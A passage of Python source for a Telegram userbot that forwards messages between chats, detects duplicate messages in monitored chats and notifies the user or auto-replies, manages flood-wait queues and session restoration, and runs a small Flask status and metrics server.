                                await send_queue.put((user_id, target_id, filtered_msg, task.get("filters", {}), forward_tag, chat_id if forward_tag else None, message.id if forward_tag else None))
                            except asyncio.QueueFull:
                                logger.warning("Send queue full")
        except Exception:
            logger.exception("Error in forward message handler")

    try:
        client.add_event_handler(_forward_message_handler, events.NewMessage())
        client.add_event_handler(_forward_message_handler, events.MessageEdited())
        forward_handler_registered[user_id] = _forward_message_handler
    except Exception:
        logger.exception("Failed to add forward event handler")

async def resolve_target_entity_once(user_id: int, client: TelegramClient, target_id: int):
    ent = _get_cached_target(user_id, target_id)
    if ent:
        return ent

    try:
        entity = await client.get_input_entity(int(target_id))
        _set_cached_target(user_id, target_id, entity)
        return entity
    except Exception:
        return None

async def resolve_targets_for_user(user_id: int, target_ids: List[int]):
    client = user_clients.get(user_id)
    if not client:
        return
    for tid in target_ids:
        for attempt in range(3):
            ent = await resolve_target_entity_once(user_id, client, tid)
            if ent:
                break
            await asyncio.sleep(TARGET_RESOLVE_RETRY_SECONDS)

# ============================
# MONITORING SYSTEM
# ============================
async def update_monitoring_for_user(user_id: int):
    if user_id not in user_clients:
        return
    
    client = user_clients[user_id]
    
    # Clear existing handlers
    if user_id in monitor_handler_registered:
        for handler in monitor_handler_registered[user_id]:
            try:
                client.remove_event_handler(handler)
            except Exception:
                pass
        monitor_handler_registered[user_id] = []
    
    # Get monitored chat IDs
    monitored_chat_ids = set()
    user_tasks = monitoring_tasks_cache.get(user_id, [])
    for task in user_tasks:
        monitored_chat_ids.update(task.get("chat_ids", []))
    
    if not monitored_chat_ids:
        logger.info(f"No monitored chats for user {user_id}")
        return
    
    # Register handlers for each chat
    for chat_id in monitored_chat_ids:
        await register_monitor_handler_for_chat(user_id, chat_id, client)
    
    logger.info(f"Updated monitoring for user {user_id}: {len(monitored_chat_ids)} chat(s)")

async def register_monitor_handler_for_chat(user_id: int, chat_id: int, client: TelegramClient):
    
    async def _monitor_chat_handler(event):
        try:
            await optimized_gc()
            
            message = event.message
            if not message:
                return
            
            if hasattr(message, 'reactions') and message.reactions:
                return
            
            message_text = event.raw_text or message.message
            if not message_text:
                return
            
            sender_id = message.sender_id
            message_id = message.id
            message_outgoing = getattr(message, "out", False)
            
            logger.debug(f"Processing monitored chat {chat_id} for user {user_id}")
            
            user_tasks_local = monitoring_tasks_cache.get(user_id, [])
            for task in user_tasks_local:
                if chat_id not in task.get("chat_ids", []):
                    continue
                
                settings = task.get("settings", {})
                task_label = task.get("label", "Unknown")
                
                if message_outgoing and not settings.get("outgoing_message_monitoring", True):
                    continue
                
                if settings.get("check_duplicate_and_notify", True):
                    message_hash = create_message_hash(message_text, sender_id)
                    
                    if is_duplicate_message(user_id, chat_id, message_hash):
                        logger.info(f"DUPLICATE DETECTED: User {user_id}, Task {task_label}, Chat {chat_id}")
                        
                        # Auto reply if enabled
                        if settings.get("auto_reply_system", False) and settings.get("auto_reply_message"):
                            auto_reply_message = settings.get("auto_reply_message", "")
                            try:
                                chat_entity = await client.get_input_entity(chat_id)
                                await client.send_message(chat_entity, auto_reply_message, reply_to=message_id)
                                logger.info(f"Auto reply sent for duplicate in chat {chat_id}")
                            except Exception as e:
                                logger.exception(f"Error sending auto reply: {e}")
                        
                        # Manual reply notification
                        if settings.get("manual_reply_system", True):
                            try:
                                if notification_queue:
                                    await notification_queue.put((user_id, task, chat_id, message_id, message_text, message_hash))
                                else:
                                    logger.error("Notification queue not initialized!")
                            except asyncio.QueueFull:
                                logger.warning("Notification queue full, dropping duplicate alert for user=%s", user_id)
                            except Exception as e:
                                logger.exception(f"Error queuing notification: {e}")
                        continue
                    
                    store_message_hash(user_id, chat_id, message_hash, message_text)
        
        except Exception as e:
            logger.exception(f"Error in monitor message handler for user {user_id}, chat {chat_id}: {e}")
    
    try:
        client.add_event_handler(_monitor_chat_handler, events.NewMessage(chats=chat_id))
        client.add_event_handler(_monitor_chat_handler, events.MessageEdited(chats=chat_id))
        
        monitor_handler_registered.setdefault(user_id, []).append(_monitor_chat_handler)
        logger.info(f"Registered monitor handler for user {user_id}, chat {chat_id}")
    except Exception as e:
        logger.exception(f"Failed to register monitor handler for user {user_id}, chat {chat_id}: {e}")

# ============================
# NOTIFICATION HANDLING
# ============================
async def handle_notification_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    
    if not update.message.reply_to_message:
        return
    
    replied_message_id = update.message.reply_to_message.message_id
    
    if replied_message_id not in notification_messages:
        return
    
    notification_data = notification_messages[replied_message_id]
    
    if notification_data["user_id"] != user_id:
        return
    
    task_label = notification_data["task_label"]
    chat_id = notification_data["chat_id"]
    original_message_id = notification_data["original_message_id"]
    message_preview = notification_data.get("message_preview", "Unknown message")
    
    user_tasks = monitoring_tasks_cache.get(user_id, [])
    task = next((t for t in user_tasks if t["label"] == task_label), None)
    
    if not task:
        await update.message.reply_text("❌ Task not found!")
        return
    
    if user_id not in user_clients:
        await update.message.reply_text("❌ You need to be logged in to send replies!")
        return
    
    client = user_clients[user_id]
    
    try:
        chat_entity = await client.get_input_entity(chat_id)
        await client.send_message(chat_entity, text, reply_to=original_message_id)
        
        escaped_text = escape_markdown(text, version=2)
        escaped_preview = escape_markdown(message_preview, version=2)
        
        await update.message.reply_text(
            f"✅ **Reply sent successfully!**\n\n"
            f"📝 **Your reply:** {escaped_text}\n"
            f"🔗 **Replying to:** `{escaped_preview}`\n\n"
            "The duplicate sender has been notified with your reply.",
            parse_mode="Markdown"
        )
        
        logger.info(f"User {user_id} sent manual reply to duplicate in chat {chat_id}")
        notification_messages.pop(replied_message_id, None)
    
    except Exception as e:
        logger.exception(f"Error sending manual reply for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ **Failed to send reply:** {str(e)}\n\n"
            "Please try again or check your connection.",
            parse_mode="Markdown"
        )

async def handle_reply_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Reply action not implemented yet")

# ============================
# FLOOD WAIT NOTIFICATIONS
# ============================
async def notify_user_flood_wait(user_id: int, wait_seconds: int):
    """Notify user about flood wait start (only once)"""
    try:
        from telegram import Bot
        bot = Bot(token=BOT_TOKEN)
        
        wait_minutes = wait_seconds // 60
        if wait_seconds % 60 > 0:
            wait_minutes += 1  # Round up
        
        resume_time = format_datetime_utc1(datetime.fromtimestamp(time.time() + wait_seconds, tz=timezone.utc))
        
        message = f"""⏰ **Flood Wait Alert**

Your account is temporarily limited by Telegram.

📋 **Details:**
• Wait time: {wait_minutes} minutes
• Resumes at: {resume_time}

⚠️ **Please note:**
• This is a Telegram restriction, not the bot
• Bot will automatically resume when the wait ends
• No action is needed on your part

🔄 **Status:** ⏳ Waiting for Telegram to lift restriction..."""
        
        await bot.send_message(user_id, message, parse_mode="Markdown")
        
    except Exception:
        pass  # Silently fail if we can't notify user

async def notify_user_flood_wait_ended(user_id: int):
    """Notify user that flood wait has ended"""
    try:
        from telegram import Bot
        bot = Bot(token=BOT_TOKEN)
        
        message = f"""✅ **Flood Wait Ended**

Your account restriction has been lifted!

📋 **Status:**
• Forwarding has resumed automatically
• All queued messages are being sent
• You can now send messages normally

🔄 **Status:** ✅ Active and forwarding..."""
        
        await bot.send_message(user_id, message, parse_mode="Markdown")
        
    except Exception:
        pass

# ============================
# WORKER SYSTEMS
# ============================
async def send_worker_loop(worker_id: int):
    logger.info(f"Send worker {worker_id} started")
    global send_queue
    if send_queue is None:
        return
    
    # Track performance
    processed_count = 0
    last_log_time = time.time()
    
    while True:
        try:
            # Use get_nowait to avoid blocking if queue is empty
            try:
                job = send_queue.get_nowait()
            except asyncio.QueueEmpty:
                await asyncio.sleep(0.01)
                continue
                
            # Process job immediately
            user_id, target_id, message_text, task_filters, forward_tag, source_chat_id, message_id = job
            
            # Check flood wait
            in_flood_wait, wait_left, should_notify_end = flood_wait_manager.is_in_flood_wait(user_id)
            
            # Send end notification if flood wait just ended
            if should_notify_end:
                asyncio.create_task(notify_user_flood_wait_ended(user_id))
            
            if in_flood_wait:
                # Requeue the job for later
                try:
                    send_queue.put_nowait(job)
                except asyncio.QueueFull:
                    logger.warning(f"Queue full while requeueing flood wait message")
                finally:
                    send_queue.task_done()
                
                # Sleep a bit before checking next job
                await asyncio.sleep(min(wait_left, 1.0))
                continue
            
            client = user_clients.get(user_id)
            if not client:
                send_queue.task_done()
                continue
            
            # Check rate limiter
            await _consume_token(user_id, 1.0)
            
            try:
                entity = _get_cached_target(user_id, target_id)
                if not entity:
                    entity = await resolve_target_entity_once(user_id, client, target_id)
                
                if not entity:
                    send_queue.task_done()
                    continue
                
                try:
                    if forward_tag and source_chat_id and message_id:
                        try:
                            source_entity = await client.get_input_entity(int(source_chat_id))
                            await client.forward_messages(entity, message_id, source_entity)
                        except Exception:
                            await client.send_message(entity, message_text)
                    else:
                        await client.send_message(entity, message_text)
                        
                    # Clear any flood wait on success
                    flood_wait_manager.clear_flood_wait(user_id)
                    
                except FloodWaitError as fwe:
                    wait = int(getattr(fwe, "seconds", 10))
                    logger.warning(f"Worker {worker_id}: Flood wait {wait}s for user {user_id}")
                    
                    # Set flood wait and check if we should notify
                    should_notify_start, wait_time = flood_wait_manager.set_flood_wait(user_id, wait)
                    
                    # Requeue the job
                    try:
                        send_queue.put_nowait(job)
                    except asyncio.QueueFull:
                        logger.warning(f"Queue full while requeueing flood wait")
                    
                    # Notify user if it's the first major flood wait
                    if should_notify_start and wait_time > 60:
                        asyncio.create_task(notify_user_flood_wait(user_id, wait_time))
                        
                except Exception as e:
                    logger.debug(f"Send failed: {e}")
                    
            except Exception as e:
                logger.debug(f"Entity resolution failed: {e}")
            
            finally:
                send_queue.task_done()
                processed_count += 1
                
                # Log performance
                current_time = time.time()
                if current_time - last_log_time > 30:
                    qsize = send_queue.qsize() if send_queue else 0
                    logger.info(f"Worker {worker_id}: Processed {processed_count}, Queue: {qsize}")
                    processed_count = 0
                    last_log_time = current_time
                    
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.01)

async def notification_worker(worker_id: int):
    logger.info(f"Notification worker {worker_id} started")
    
    if notification_queue is None:
        logger.error("notification_worker started before queue initialized")
        return
    
    bot_instance = None
    
    while True:
        try:
            user_id, task, chat_id, message_id, message_text, message_hash = await notification_queue.get()
            logger.info(f"Processing notification for user {user_id}, chat {chat_id}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.exception(f"Error getting item from notification_queue in worker {worker_id}: {e}")
            break
        
        try:
            settings = task.get("settings", {})
            if not settings.get("manual_reply_system", True):
                logger.debug(f"Manual reply system disabled for user {user_id}")
                continue
            
            task_label = task.get("label", "Unknown")
            preview_text = message_text[:100] + "..." if len(message_text) > 100 else message_text
            
            # Get bot instance if not available
            if bot_instance is None:
                from telegram import Bot
                bot_instance = Bot(token=BOT_TOKEN)
            
            current_time = format_datetime_utc1()
            notification_msg = (
                f"🚨 **DUPLICATE MESSAGE DETECTED!**\n\n"
                f"**Task:** {task_label}\n"
                f"**Time:** {current_time}\n\n"
                f"📝 **Message Preview:**\n`{preview_text}`\n\n"
                f"💬 **Reply to this message to respond to the duplicate!**\n"
                f"(Swipe left on this message and type your reply)"
            )
            
            try:
                sent_message = await bot_instance.send_message(
                    chat_id=user_id,
                    text=notification_msg,
                    parse_mode="Markdown"
                )
                
                notification_messages[sent_message.message_id] = {
                    "user_id": user_id,
                    "task_label": task_label,
                    "chat_id": chat_id,
                    "original_message_id": message_id,
                    "duplicate_hash": message_hash,
                    "message_preview": preview_text
                }
                
                logger.info(f"✅ Sent duplicate notification to user {user_id} for chat {chat_id}")
            
            except Exception as e:
                logger.error(f"Failed to send notification to user {user_id}: {e}")
        
        except Exception as e:
            logger.exception(f"Unexpected error in notification worker {worker_id}: {e}")
        finally:
            try:
                notification_queue.task_done()
            except Exception:
                pass

async def start_send_workers():
    global _send_workers_started, send_queue, send_worker_tasks
    if _send_workers_started:
        return

    if send_queue is None:
        send_queue = asyncio.Queue(maxsize=SEND_QUEUE_MAXSIZE)

    for i in range(SEND_WORKER_COUNT):
        t = asyncio.create_task(send_worker_loop(i + 1))
        send_worker_tasks.append(t)

    _send_workers_started = True
    logger.info(f"Spawned {SEND_WORKER_COUNT} send workers")

async def start_monitor_workers():
    global _monitor_workers_started, notification_queue, monitor_worker_tasks
    if _monitor_workers_started:
        return

    if notification_queue is None:
        notification_queue = asyncio.Queue(maxsize=SEND_QUEUE_MAXSIZE)

    for i in range(MONITOR_WORKER_COUNT):
        t = asyncio.create_task(notification_worker(i + 1))
        monitor_worker_tasks.append(t)

    _monitor_workers_started = True
    logger.info(f"Spawned {MONITOR_WORKER_COUNT} monitor workers")

async def monitor_queue_health():
    """Monitor queue health and adjust processing"""
    global send_queue, notification_queue
    
    while True:
        try:
            # Check send queue
            if send_queue:
                qsize = send_queue.qsize()
                maxsize = send_queue.maxsize if hasattr(send_queue, 'maxsize') else SEND_QUEUE_MAXSIZE
                
                # Log queue status
                if qsize > maxsize * 0.8:
                    logger.warning(f"Send queue nearly full: {qsize}/{maxsize}")
                
                # If queue is too full, skip some messages to avoid memory issues
                if qsize > maxsize * 0.9:
                    try:
                        for _ in range(min(10, qsize // 10)):
                            send_queue.get_nowait()
                            send_queue.task_done()
                    except asyncio.QueueEmpty:
                        pass
            
            # Check notification queue
            if notification_queue:
                nqsize = notification_queue.qsize()
                nmaxsize = notification_queue.maxsize if hasattr(notification_queue, 'maxsize') else SEND_QUEUE_MAXSIZE
                
                if nqsize > nmaxsize * 0.8:
                    logger.warning(f"Notification queue nearly full: {nqsize}/{nmaxsize}")
                
                if nqsize > nmaxsize * 0.9:
                    try:
                        for _ in range(min(10, nqsize // 10)):
                            notification_queue.get_nowait()
                            notification_queue.task_done()
                    except asyncio.QueueEmpty:
                        pass
                    
            await asyncio.sleep(5)  # Check every 5 seconds
            
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(5)

async def performance_logger():
    """Log performance metrics periodically"""
    while True:
        try:
            send_qsize = send_queue.qsize() if send_queue else 0
            notify_qsize = notification_queue.qsize() if notification_queue else 0
            active_users = len(user_clients)
            forward_tasks = sum(len(tasks) for tasks in forwarding_tasks_cache.values())
            monitor_tasks = sum(len(tasks) for tasks in monitoring_tasks_cache.values())
            
            logger.info(f"📊 Performance: SendQ={send_qsize}, NotifyQ={notify_qsize}, Users={active_users}, ForwardTasks={forward_tasks}, MonitorTasks={monitor_tasks}")
            
            await asyncio.sleep(60)  # Log every minute
            
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(60)

# ============================
# USER SYSTEM INITIALIZATION
# ============================
async def start_forwarding_for_user(user_id: int):
    if user_id not in user_clients:
        return

    client = user_clients[user_id]
    forwarding_tasks_cache.setdefault(user_id, [])
    _ensure_user_target_cache(user_id)
    _ensure_user_send_semaphore(user_id)
    _ensure_user_rate_limiter(user_id)

    ensure_forward_handler_registered_for_user(user_id, client)
    
    user_tasks = forwarding_tasks_cache.get(user_id, [])
    if user_tasks:
        all_targets = []
        for task in user_tasks:
            all_targets.extend(task.get("target_ids", []))
        
        if all_targets:
            unique_targets = list(set(all_targets))
            asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))

async def start_monitoring_for_user(user_id: int):
    if user_id not in user_clients:
        logger.warning(f"User {user_id} not in user_clients")
        return
    
    client = user_clients[user_id]
    monitoring_tasks_cache.setdefault(user_id, [])
    chat_entity_cache.setdefault(user_id, {})
    
    await update_monitoring_for_user(user_id)

async def update_forwarding_for_user(user_id: int):
    if user_id not in user_clients:
        return
    
    client = user_clients[user_id]
    
    # Re-register forwarding handler
    if user_id in forward_handler_registered:
        handler = forward_handler_registered.get(user_id)
        if handler:
            try:
                client.remove_event_handler(handler)
            except Exception:
                pass
        forward_handler_registered.pop(user_id, None)
    
    ensure_forward_handler_registered_for_user(user_id, client)
    
    # Resolve targets
    user_tasks = forwarding_tasks_cache.get(user_id, [])
    if user_tasks:
        all_targets = []
        for task in user_tasks:
            all_targets.extend(task.get("target_ids", []))
        
        if all_targets:
            unique_targets = list(set(all_targets))
            asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))

async def restore_sessions():
    logger.info("🔄 Restoring sessions...")

    # Restore from environment
    for user_id, session_string in USER_SESSIONS.items():
        if len(user_clients) >= MAX_CONCURRENT_USERS:
            continue
            
        try:
            await restore_single_session(user_id, session_string, from_env=True)
        except Exception:
            pass

    # Restore from database
    try:
        users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS * 2))
    except Exception:
        users = []

    # Load forwarding tasks
    try:
        all_forward_active = await db_call(db.get_all_active_forwarding_tasks)
    except Exception:
        all_forward_active = []

    # Load monitoring tasks
    try:
        all_monitor_active = await db_call(db.get_all_active_monitoring_tasks)
    except Exception:
        all_monitor_active = []

    # Clear and populate caches
    forwarding_tasks_cache.clear()
    monitoring_tasks_cache.clear()
    
    for t in all_forward_active:
        uid = t["user_id"]
        forwarding_tasks_cache.setdefault(uid, []).append({
            "id": t["id"], 
            "label": t["label"], 
            "source_ids": t["source_ids"], 
            "target_ids": t["target_ids"], 
            "is_active": 1,
            "filters": t.get("filters", {})
        })
    
    for t in all_monitor_active:
        uid = t["user_id"]
        monitoring_tasks_cache.setdefault(uid, []).append({
            "id": t["id"],
            "label": t["label"],
            "chat_ids": t["chat_ids"],
            "is_active": 1,
            "settings": t.get("settings", {})
        })

    # Restore sessions in batches
    batch_size = 3
    restore_tasks = []
    for row in users:
        try:
            user_id = row.get("user_id") if isinstance(row, dict) else row[0]
            session_data = row.get("session_data") if isinstance(row, dict) else row[1]
        except Exception:
            continue

        if session_data and user_id not in user_clients:
            restore_tasks.append(restore_single_session(user_id, session_data, from_env=False))

        if len(restore_tasks) >= batch_size:
            await asyncio.gather(*restore_tasks, return_exceptions=True)
            restore_tasks = []
            await asyncio.sleep(0.5)
    
    if restore_tasks:
        await asyncio.gather(*restore_tasks, return_exceptions=True)

async def restore_single_session(user_id: int, session_data: str, from_env: bool = False):
    try:
        client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            if len(user_clients) >= MAX_CONCURRENT_USERS:
                try:
                    await client.disconnect()
                except Exception:
                    pass
                if not from_env:
                    await db_call(db.save_user, user_id, None, None, None, True)
                return

            user_clients[user_id] = client
            
            try:
                me = await client.get_me()
                user_name = me.first_name or "User"
                
                user = await db_call(db.get_user, user_id)
                has_phone = user and user.get("phone")
                
                await db_call(db.save_user, user_id, 
                            user["phone"] if user else None,
                            user_name, 
                            session_data, 
                            True)
                
                # Initialize caches
                target_entity_cache.setdefault(user_id, OrderedDict())
                chat_entity_cache.setdefault(user_id, {})
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                
                # Start both systems
                await start_forwarding_for_user(user_id)
                await start_monitoring_for_user(user_id)
                
                # Resolve targets for forwarding
                user_forward_tasks = forwarding_tasks_cache.get(user_id, [])
                if user_forward_tasks:
                    all_targets = []
                    for tt in user_forward_tasks:
                        all_targets.extend(tt.get("target_ids", []))
                    
                    if all_targets:
                        unique_targets = list(set(all_targets))
                        asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))
                
                source = "environment variable" if from_env else "database"
                logger.info(f"✅ Restored session for user {user_id} from {source}")
                
            except Exception as e:
                logger.exception(f"Error in restore_single_session for user {user_id}: {e}")
                try:
                    target_entity_cache.setdefault(user_id, OrderedDict())
                    chat_entity_cache.setdefault(user_id, {})
                    _ensure_user_send_semaphore(user_id)
                    _ensure_user_rate_limiter(user_id)
                    await start_forwarding_for_user(user_id)
                    await start_monitoring_for_user(user_id)
                except Exception:
                    pass
        else:
            if not from_env:
                await db_call(db.save_user, user_id, None, None, None, False)
    except Exception as e:
        logger.exception(f"Failed to restore session for user {user_id}: {e}")
        if not from_env:
            try:
                await db_call(db.save_user, user_id, None, None, None, False)
            except Exception:
                pass

# ============================
# WEB SERVER
# ============================
class WebServer:
    
    def __init__(self, port: int = 5000):
        self.port = port
        self.app = Flask(__name__)
        self.start_time = time.time()
        self._monitor_callback = None
        self._cached_container_limit_mb = None
        self.setup_routes()
    
    def register_monitoring(self, callback):
        self._monitor_callback = callback
        logger.info("Monitoring callback registered")
    
    def _mb_from_bytes(self, n_bytes: int) -> float:
        return round(n_bytes / (1024 * 1024), 2)
    
    def _read_cgroup_memory_limit_bytes(self) -> int:
        candidates = [
            "/sys/fs/cgroup/memory.max",
            "/sys/fs/cgroup/memory/memory.limit_in_bytes",
        ]

        for path in candidates:
            try:
                if not os.path.exists(path):
                    continue
                with open(path, "r") as fh:
                    raw = fh.read().strip()
                if raw == "max":
                    return 0
                val = int(raw)
                if val <= 0:
                    return 0
                if val > (1 << 50):
                    return 0
                return val
            except Exception:
                continue

        try:
            with open("/proc/self/cgroup", "r") as fh:
                lines = fh.read().splitlines()
            for ln in lines:
                parts = ln.split(":")
                if len(parts) >= 3:
                    controllers = parts[1]
                    cpath = parts[2]
                    if "memory" in controllers.split(","):
                        possible = f"/sys/fs/cgroup/memory{cpath}/memory.limit_in_bytes"
                        if os.path.exists(possible):
                            with open(possible, "r") as fh:
                                raw = fh.read().strip()
                            val = int(raw)
                            if val > 0 and val < (1 << 50):
                                return val
                        possible2 = f"/sys/fs/cgroup{cpath}/memory.max"
                        if os.path.exists(possible2):
                            with open(possible2, "r") as fh:
                                raw = fh.read().strip()
                            if raw != "max":
                                val = int(raw)
                                if val > 0 and val < (1 << 50):
                                    return val
        except Exception:
            pass

        return 0
    
    def get_container_memory_limit_mb(self) -> float:
        if self._cached_container_limit_mb is not None:
            return self._cached_container_limit_mb

        bytes_limit = self._read_cgroup_memory_limit_bytes()
        if bytes_limit and bytes_limit > 0:
            self._cached_container_limit_mb = self._mb_from_bytes(bytes_limit)
        else:
            self._cached_container_limit_mb = float(os.getenv("CONTAINER_MAX_RAM_MB", str(DEFAULT_CONTAINER_MAX_RAM_MB)))
        return self._cached_container_limit_mb
    
    def setup_routes(self):
        
        @self.app.route("/", methods=["GET"])
        def home():
            container_limit = self.get_container_memory_limit_mb()
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Forwarder + DuoDetective Bot Status</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        text-align: center;
                        padding: 50px;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                    }}
                    .status {{
                        background: rgba(255,255,255,0.1);
                        padding: 30px;
                        border-radius: 15px;
                        max-width: 600px;
                        margin: 0 auto;
                        text-align: left;
                    }}
                    h1 {{ font-size: 2.2em; margin: 0; text-align: center; }}
                    p {{ font-size: 1.0em; }}
                    .emoji {{ font-size: 2.5em; text-align: center; }}
                    .stats {{ font-family: monospace; margin-top: 12px; }}
                </style>
            </head>
            <body>
                <div class="status">
                    <div class="emoji">🤖🔍</div>
                    <h1>Forwarder + DuoDetective Bot</h1>
                    <p>Combined bot is running. Use the monitoring endpoints:</p>
                    <ul>
                      <li>/health — basic uptime</li>
                      <li>/webhook — simple webhook endpoint</li>
                      <li>/metrics — system metrics</li>
                    </ul>
                    <div class="stats">
                      <strong>Container memory limit (detected):</strong> {container_limit} MB
                    </div>
                </div>
            </body>
            </html>
            """
            return html
        
        @self.app.route("/health", methods=["GET"])
        def health():
            uptime = int(time.time() - self.start_time)
            return jsonify({"status": "healthy", "uptime_seconds": uptime}), 200
        
        @self.app.route("/webhook", methods=["GET", "POST"])
        def webhook():
            now = int(time.time())
            if request.method == "POST":
                data = request.get_json(silent=True)
                return jsonify({"status": "ok", "received": True, "timestamp": now, "data": data}), 200
            else:
                return jsonify({"status": "ok", "method": "GET", "timestamp": now}), 200
        
        @self.app.route("/metrics", methods=["GET"])
        def metrics():
            if self._monitor_callback is None:
                return jsonify({"status": "unavailable", "reason": "no monitor registered"}), 200

            try:
                data = self._monitor_callback()
                return jsonify({"status": "ok", "metrics": data}), 200
            except Exception as e:
                logger.exception("Monitoring callback failed")
                return jsonify({"status": "error", "error": str(e)}), 500
    
    def run_server(self):
        self.app.run(host="0.0.0.0", port=self.port, debug=False, use_reloader=False, threaded=True)
    
    def start(self):
        server_thread = threading.Thread(target=self.run_server, daemon=True)
        server_thread.start()
        logger.info(f"🌐 Web server started on port {self.port}")

web_server = WebServer(port=WEB_SERVER_PORT)

# ============================
# SHUTDOWN & CLEANUP
# ============================
async def shutdown_cleanup():
    logger.info("Shutdown cleanup...")

    # Cancel worker tasks
    for t in list(send_worker_tasks):
        try:
            t.cancel()
        except Exception:
            pass
    
    for t in list(monitor_worker_tasks):
        try:
            t.cancel()
        except Exception:
            pass
    
    if send_worker_tasks or monitor_worker_tasks:
        try:
            await asyncio.gather(*send_worker_tasks, *monitor_worker_tasks, return_exceptions=True)
        except Exception:
            pass

    # Disconnect all clients
    user_ids = list(user_clients.keys())
    batch_size = 5
    for i in range(0, len(user_ids), batch_size):
        batch = user_ids[i:i + batch_size]
        disconnect_tasks = []
        for uid in batch:
            client = user_clients.get(uid)
            if not client:
                continue

            # Remove forwarding handler
            if uid in forward_handler_registered:
                handler = forward_handler_registered.get(uid)
                if handler:
                    try:
                        client.remove_event_handler(handler)
                    except Exception:
                        pass
                forward_handler_registered.pop(uid, None)
            
            # Remove monitoring handlers
            if uid in monitor_handler_registered:
                for handler in monitor_handler_registered[uid]:
                    try:
                        client.remove_event_handler(handler)
                    except Exception:
                        pass
                monitor_handler_registered.pop(uid, None)

            try:
                disconnect_tasks.append(client.disconnect())
            except Exception:
                try:
                    sess = getattr(client, "session", None)
                    if sess is not None:
                        try:
                            sess.close()
                        except Exception:
                            pass
                except Exception:
                    pass

        if disconnect_tasks:
            try:
                await asyncio.gather(*disconnect_tasks, return_exceptions=True)
            except Exception:
                pass

    # Clear all caches
    user_clients.clear()
    forwarding_tasks_cache.clear()
    monitoring_tasks_cache.clear()
    phone_verification_states.clear()
    target_entity_cache.clear()
    chat_entity_cache.clear()
    user_send_semaphores.clear()
    user_rate_limiters.clear()
    message_history.clear()
    notification_messages.clear()
    reply_states.clear()
    auto_reply_states.clear()

    try:
        db.close_connection()
    except Exception:
        pass

    logger.info("Shutdown cleanup complete.")

async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in phone_verification_states:
        await handle_phone_verification(update, context)
        return
    
    if context.user_data.get("awaiting_input"):
        action = context.user_data.get("owner_action")
        
        if action == "get_user_string":
            await handle_get_user_string(update, context)
        elif action == "add_user":
            await handle_add_user(update, context)
        elif action == "remove_user":
            await handle_remove_user(update, context)
        return
    
    if user_id in login_states:
        await handle_login_process(update, context)
        return
    
    if user_id in task_creation_states:
        await handle_task_creation(update, context)
        return
    
    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
        await handle_prefix_suffix_input(update, context)
        return
    
    if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
        await handle_auto_reply_message(update, context)
        return
    
    if update.message.reply_to_message:
        await handle_notification_reply(update, context)
        return
    
    if user_id in logout_states:
        handled = await handle_logout_confirmation(update, context)
        if handled:
            return
    
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return
    
    await update.message.reply_text(
        "🤔 **I didn't understand that command.**\n\nUse /start to see available commands.",
        parse_mode="Markdown"
    )

# ============================
# MAIN INITIALIZATION
# ============================
async def post_init(application: Application):
    global MAIN_LOOP
    MAIN_LOOP = asyncio.get_running_loop()

    logger.info("🔧 Initializing combined bot...")

    await application.bot.delete_webhook(drop_pending_updates=True)
    logger.info("🧹 Cleared webhooks")

    def _signal_handler(sig_num, frame):
        logger.info(f"Signal {sig_num} received")
        try:
            if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
                future = asyncio.run_coroutine_threadsafe(_graceful_shutdown(application), MAIN_LOOP)
                try:
                    future.result(timeout=30)
                except Exception:
                    pass
        except Exception:
            pass

    try:
        signal.signal(signal.SIGINT, _signal_handler)
        signal.signal(signal.SIGTERM, _signal_handler)
    except Exception:
        pass

    # Add owner IDs to allowed users
    if OWNER_IDS:
        for oid in OWNER_IDS:
            try:
                is_admin = await db_call(db.is_user_admin, oid)
                if not is_admin:
                    await db_call(db.add_allowed_user, oid, None, True, None)
            except Exception:
                pass

    # Add allowed users from environment
    if ALLOWED_USERS:
        for au in ALLOWED_USERS:
            try:
                await db_call(db.add_allowed_user, au, None, False, None)
            except Exception:
                pass

    # Start worker systems
    await start_send_workers()
    await start_monitor_workers()
    
    # Start monitoring tasks
    asyncio.create_task(monitor_queue_health())
    asyncio.create_task(performance_logger())
    
    # Restore sessions
    await restore_sessions()

    # Setup metrics collection
    async def _collect_metrics():
        try:
            send_q = send_queue.qsize() if send_queue is not None else None
            notify_q = notification_queue.qsize() if notification_queue is not None else None
            
            return {
                "send_queue_size": send_q,
                "notification_queue_size": notify_q,
                "send_worker_count": len(send_worker_tasks),
                "monitor_worker_count": len(monitor_worker_tasks),
                "active_user_clients_count": len(user_clients),
                "forwarding_tasks_counts": {uid: len(forwarding_tasks_cache.get(uid, [])) for uid in list(forwarding_tasks_cache.keys())[:10]},
                "monitoring_tasks_counts": {uid: len(monitoring_tasks_cache.get(uid, [])) for uid in list(monitoring_tasks_cache.keys())[:10]},
                "message_history_size": sum(len(v) for v in message_history.values()),
                "duplicate_window_seconds": DUPLICATE_CHECK_WINDOW,
                "max_users": MAX_CONCURRENT_USERS,
            }
        except Exception as e:
            return {"error": f"failed to collect metrics: {e}"}

    def _forward_metrics():
        if MAIN_LOOP is not None:
            try:
                future = asyncio.run_coroutine_threadsafe(_collect_metrics(), MAIN_LOOP)
                return future.result(timeout=1.0)
            except Exception:
                return {"error": "failed to collect metrics"}
        else:
